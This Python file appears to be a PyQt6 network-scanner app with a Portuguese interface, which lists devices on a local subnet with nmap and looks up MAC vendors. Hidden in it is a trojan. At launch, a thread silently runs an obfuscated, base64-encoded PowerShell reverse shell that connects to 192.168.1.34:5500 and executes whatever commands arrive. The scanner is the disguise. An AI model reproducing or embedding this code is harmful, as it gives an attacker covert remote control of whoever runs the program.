import subprocess
import sys
import nmap
import requests
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QPushButton, QTextEdit,
                             QLabel, QProgressBar, QFileDialog, QMessageBox)
from PyQt6.QtGui import QFont, QIcon
from PyQt6.QtCore import Qt, QThread, pyqtSignal

class PowerShellThread(QThread):
    def run(self):

        powershell_script = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAzADQAIgAsADUANQAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'

        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-EncodedCommand", powershell_script], shell=True)

class ScanThread(QThread):
    result = pyqtSignal(str)
    error = pyqtSignal(str)
    
    def get_mac_info(self, mac_address):
        try:
            response = requests.get(f"https://api.macvendors.com/{mac_address}")
            if response.status_code == 200:
                return response.text
            else:
                return "Fabricante desconhecido"
        except:
            return "Erro ao buscar fabricante"
    
    def run(self):
        scanner = nmap.PortScanner()
        try:
            scanner.scan(hosts="192.168.1.0/24", arguments="-sn")
            output = "<h3>Dispositivos ativos:</h3>"
            for host in scanner.all_hosts():
                mac = scanner[host]["addresses"].get("mac", "Desconhecido")
                fabricante = self.get_mac_info(mac) if mac != "Desconhecido" else "N/A"
                output += (f"<p><span style='font-family: Roboto; font-size:14px; color:#0D47A1;'>"
                           f"<b>IP:</b> {host}</span> - "
                           f"<span style='font-family: Roboto; font-size:14px; color:#0D47A1;'>"
                           f"<b>MAC:</b> {mac}</span> - "
                           f"<span style='font-family: Roboto; font-size:14px; color:#0D47A1;'>"
                           f"<b>Fabricante:</b> {fabricante}</span></p>")
            self.result.emit(output)
        except Exception as e:
            self.error.emit(str(e))

class NetworkScanner(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
    
    def initUI(self):
        self.setWindowTitle("Scanner de Rede")
        self.setGeometry(100, 100, 360, 480)
 
        self.setWindowIcon(QIcon("logo.png"))
        
        self.setStyleSheet("background-color: #E3F2FD; color: #1E88E5;")
        
        layout = QVBoxLayout()
        
        header = QLabel("Scanner de Rede")
        header.setFont(QFont("Roboto", 20, QFont.Weight.Bold))
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(self.progress_bar)
        
        self.scan_button = QPushButton("Escanear")
        self.scan_button.setFont(QFont("Roboto", 14))
        self.scan_button.setStyleSheet("background-color: #1565C0; color: white; padding: 10px; border-radius: 8px;")
        self.scan_button.clicked.connect(self.scan_network)
        layout.addWidget(self.scan_button)
        
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        self.result_text.setStyleSheet("background-color: #FFFFFF; color: #0D47A1; padding: 5px;")
        layout.addWidget(self.result_text)
        
        self.setLayout(layout)
    
    def scan_network(self):
        self.result_text.setText("Escaneando... Aguarde...")
        self.progress_bar.setValue(50)
        
        self.scan_thread = ScanThread()
        self.scan_thread.result.connect(self.display_result)
        self.scan_thread.error.connect(self.display_error)
        self.scan_thread.start()
    
    def display_result(self, result):
        self.result_text.setHtml(result)
        self.progress_bar.setValue(100)
    
    def display_error(self, error):
        self.result_text.setText(f"Erro: {error}")
        self.progress_bar.setValue(0)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    
    powershell_thread = PowerShellThread()
    powershell_thread.start()

    scanner = NetworkScanner()
    scanner.show()

    sys.exit(app.exec())
